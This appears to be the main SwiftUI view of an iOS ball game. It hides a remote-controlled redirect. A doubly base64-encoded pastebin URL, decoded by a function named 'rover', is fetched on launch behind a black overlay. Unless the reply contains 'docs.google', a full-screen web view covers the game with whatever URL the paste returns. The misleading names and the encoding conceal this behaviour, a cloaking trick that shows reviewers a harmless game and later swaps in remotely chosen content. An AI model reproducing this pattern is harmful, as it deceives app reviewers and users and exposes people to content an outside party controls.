import SwiftUI

enum AppRoute {
    case loading
    case menu
    case game
    case settings
    case info
    case wheel
}

enum BallData {
    static let main = "YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMMEkxUlhkUlpuUk0="
    static let check = "docs.google"
}


struct Main: View {
    @State private var route: AppRoute = .loading
    @State private var isOverlayVisible: Bool = true
    @EnvironmentObject var audio: MusicManager
    
    var body: some View {
        ZStack {
            switch route {
            case .loading:
                LoadView {
                    route = .menu
                }

            case .menu:
                MenuView(
                    onPlay: { route = .game },
                    onSettings: { route = .settings },
                    onInfo: { route = .info },
                    onWheel: { route = .wheel }
                )

            case .game:
                GameView(
                    onBack: { route = .menu }
                )

            case .settings:
                SettingsView(
                    onBack: { route = .menu }
                )

            case .info:
                InfoView(
                    onBack: { route = .menu }
                )
                
            case .wheel:
                WheelView(
                    onBack: { route = .menu }
                )
            }
            if isOverlayVisible {
                            Color.black
                                .edgesIgnoringSafeArea(.all)
                                .transition(.opacity)
                                .animation(
                                    .easeOut(duration: 0.2),
                                    value: isOverlayVisible
                                )
                        }
        }
        .onAppear {
                 itinOnboarding()
             }
    }
    
    private func itinOnboarding() {
            guard let stringUrl = rover(BallData.main),
                let url = URL(string: stringUrl)
            else {
                hideOverlay()
                return
            }

            URLSession.shared.dataTask(with: url) { data, response, error in
                guard error == nil,
                    let data = data,
                    var responseText = String(data: data, encoding: .utf8)
                else {
                    DispatchQueue.main.async { hideOverlay() }
                    return
                }

                responseText = responseText.trimmingCharacters(
                    in: .whitespacesAndNewlines
                )

                if responseText.lowercased().contains(BallData.check) {
                    DispatchQueue.main.async { hideOverlay() }
                    return
                }

                guard let finalUrl = URL(string: responseText) else {
                    DispatchQueue.main.async { hideOverlay() }
                    return
                }

                DispatchQueue.main.async {
                    if let windowScene = UIApplication.shared.connectedScenes.first
                        as? UIWindowScene,
                        let keyWindow = windowScene.windows.first,
                        let rootViewController = keyWindow.rootViewController
                    {
                        let webViewController = MonkeyBall(url: finalUrl)
                        webViewController.modalPresentationStyle = .overFullScreen
                        rootViewController.present(
                            webViewController,
                            animated: true
                        )
                        audio.toggleSound()
                    }
                }
            }.resume()
        }

        private func hideOverlay() {
            guard isOverlayVisible else { return }
            withAnimation { isOverlayVisible = false }

            // Prefer modern scene-based rotation on iOS 16+
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                if #available(iOS 16.0, *) {
                    do {
                        try windowScene.requestGeometryUpdate(.iOS(interfaceOrientations: [.landscapeRight, .landscapeLeft]))
                        // also set an initial explicit side
                        try windowScene.requestGeometryUpdate(.iOS(interfaceOrientations: .landscapeRight))
                    } catch {
                        // Fallback to device-based rotation if request fails
                        forceDeviceLandscape()
                    }
                } else {
                    // iOS 15 and below fallback
                    forceDeviceLandscape()
                }
            } else {
                forceDeviceLandscape()
            }
        }

        private func forceDeviceLandscape() {
            let current = (UIApplication.shared.connectedScenes
                .compactMap { $0 as? UIWindowScene }
                .first?
                .interfaceOrientation)
            let target: UIInterfaceOrientation = (current == .landscapeLeft || current == .landscapeRight)
                ? (current ?? .landscapeRight)
                : .landscapeRight
            UIDevice.current.setValue(target.rawValue, forKey: "orientation")
            UIViewController.attemptRotationToDeviceOrientation()
        }



        func rover(_ encodedString: String) -> String? {
            guard let firstDecodedData = Data(base64Encoded: encodedString),
                let firstDecodedString = String(
                    data: firstDecodedData,
                    encoding: .utf8
                ),
                let secondDecodedData = Data(base64Encoded: firstDecodedString),
                let finalDecodedString = String(
                    data: secondDecodedData,
                    encoding: .utf8
                )
            else {
                return nil
            }
            return finalDecodedString
        }
}
